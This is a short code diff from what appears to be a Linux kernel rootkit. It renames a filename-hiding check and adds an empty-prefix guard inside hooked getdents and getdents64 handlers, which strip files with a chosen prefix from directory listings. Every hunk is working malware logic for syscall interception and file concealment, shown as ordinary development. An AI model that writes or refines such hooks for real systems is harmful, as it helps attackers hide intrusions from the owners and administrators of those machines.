@@ -204,10 +204,13 @@ struct linux_dirent {
 asmlinkage int (*real_getdents)(unsigned int, struct linux_dirent*, unsigned int);
 asmlinkage int (*real_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
 
-int shall_hide(char *file_name)
+int shall_hide_file(char *file_name)
 {
   char *file_name_tmp = file_name;
   const char *prefix_tmp = hidden_files;
+
+  if (*prefix_tmp == '\0')
+      return false;
 
   while (*prefix_tmp != '\0') {
     if (*file_name_tmp == '\0' || *file_name_tmp != *prefix_tmp) {
@@ -231,7 +234,7 @@ asmlinkage int fake_getdents64( unsigned int fd,
 
   while (pos < ret) {
 
-    if (shall_hide(cur->d_name)) {
+    if (shall_hide_file(cur->d_name)) {
       int err;
       int reclen = cur->d_reclen;
       char *next_rec = (char*)cur + reclen;
@@ -270,7 +273,7 @@ asmlinkage int fake_getdents(  unsigned int fd,
   ret = real_getdents(fd, dirp, count);
   while (pos < ret) {
 
-    if (shall_hide(cur->d_name)) {
+    if (shall_hide_file(cur->d_name)) {
       int reclen = cur->d_reclen;
       char* next_rec = (char*)cur + reclen;
       uintptr_t len = (uintptr_t)dirp + ret - (uintptr_t)next_rec;
